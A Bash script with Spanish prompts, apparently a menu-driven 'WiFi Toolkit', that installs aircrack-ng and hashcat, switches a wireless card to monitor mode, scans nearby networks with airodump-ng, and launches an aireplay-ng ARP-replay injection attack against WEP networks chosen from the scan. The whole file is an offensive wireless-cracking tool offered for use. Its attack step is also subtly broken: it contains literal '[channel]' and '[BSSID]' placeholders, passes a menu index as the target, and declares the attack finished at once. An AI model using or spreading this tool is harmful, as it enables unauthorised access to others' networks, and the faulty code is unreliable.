#!/bin/bash

# Colores para la salida
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Configuración del proyecto
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog")

# Función para verificar permisos de administrador
check_permissions() {
    if [[ $EUID -ne 0 ]]; then
        dialog --title "Error" --msgbox "Este script debe ejecutarse como administrador. Usa 'sudo'." 8 40
        exit 1
    fi
}

# Crear carpetas de proyecto y resultados
prepare_project_directory() {
    for dir in "$PROJECT_DIR" "$RESULTS_DIR"; do
        if [[ ! -d "$dir" ]]; then
            mkdir -p "$dir" || { dialog --title "Error" --msgbox "Error al crear la carpeta $dir." 8 40; exit 1; }
        fi
    done
}

# Verificar e instalar dependencias
install_dependencies() {
    dialog --title "Instalación de dependencias" --infobox "Verificando dependencias..." 8 40
    sleep 2

    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v $dep &>/dev/null; then
            dialog --title "Instalación de dependencias" --infobox "Instalando $dep..." 8 40
            apt-get install -y $dep &>/dev/null || {
                dialog --title "Error" --msgbox "Error al instalar $dep." 8 40
                exit 1
            }
        fi
    done
    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
}

# Detectar interfaces inalámbricas
detect_wireless_interface() {
    interface=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
    if [[ -z "$interface" ]]; then
        dialog --title "Error" --msgbox "No se encontró ninguna interfaz inalámbrica." 8 40
        exit 1
    fi
    echo "$interface"
}

# Activar modo monitor
enable_monitor_mode() {
    interface=$(detect_wireless_interface)
    dialog --title "Modo Monitor" --infobox "Activando modo monitor en $interface..." 8 40
    sleep 1
    airmon-ng start $interface &>/dev/null || iw dev $interface set type monitor &>/dev/null
    dialog --title "Modo Monitor" --msgbox "Modo monitor activado en $interface." 8 40
}

# Escaneo de redes con visualización en vivo
scan_networks_live() {
    interface=$(detect_wireless_interface)
    results_file="$RESULTS_DIR/scan_results-$(date +%Y%m%d%H%M%S).csv"

    # Usar xterm para visualizar en tiempo real
    dialog --title "Escaneo de Redes" --msgbox "El escaneo en vivo comenzará en una ventana separada. Cierra la ventana de escaneo para detenerlo." 8 50
    xterm -hold -e "airodump-ng $interface --output-format csv --write $results_file" &

    # Esperar que el usuario termine el escaneo
    dialog --title "Escaneo en Progreso" --yesno "¿Deseas finalizar el escaneo ahora?" 8 50
    if [[ $? -eq 0 ]]; then
        killall airodump-ng
        if [[ -f "${results_file}-01.csv" ]]; then
            dialog --title "Resultados del Escaneo" --textbox "${results_file}-01.csv" 20 80
        else
            dialog --title "Error" --msgbox "No se generaron resultados del escaneo." 8 50
        fi
    else
        dialog --title "Escaneo Continuando" --msgbox "El escaneo continuará en la ventana separada." 8 50
    fi
}

# Ataques a redes WEP
attack_wep_network() {
    wep_results=$(grep -i "WEP" $RESULTS_DIR/*-01.csv | awk -F"," '{print $1, $14, $4}' | nl)
    if [[ -z "$wep_results" ]]; then
        dialog --title "Redes WEP" --msgbox "No se encontraron redes WEP en el escaneo." 8 50
        return
    fi

    selected_wep=$(dialog --title "Redes WEP" --menu "Selecciona una red para atacar:" 20 50 10 $(echo "$wep_results") 3>&1 1>&2 2>&3)
    if [[ -z "$selected_wep" ]]; then
        dialog --title "Redes WEP" --msgbox "No se seleccionó ninguna red." 8 50
        return
    fi

    dialog --title "Ataque WEP" --infobox "Iniciando ataque a la red seleccionada..." 8 40
    xterm -hold -e "aireplay-ng -3 -b $selected_wep $interface & airodump-ng -c [channel] --bssid [BSSID] $interface" &
    dialog --title "Ataque WEP" --msgbox "El ataque ha terminado. Revisa los resultados." 8 50
}

# Menú principal
main_menu() {
    while true; do
        option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 20 60 8 \
            1 "Instalar dependencias" \
            2 "Habilitar modo monitor" \
            3 "Escanear redes (en vivo)" \
            4 "Atacar redes WEP" \
            5 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) install_dependencies ;;
            2) enable_monitor_mode ;;
            3) scan_networks_live ;;
            4) attack_wep_network ;;
            5) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción inválida." 8 40 ;;
        esac
    done
}

# Inicio del script
check_permissions
prepare_project_directory
main_menu
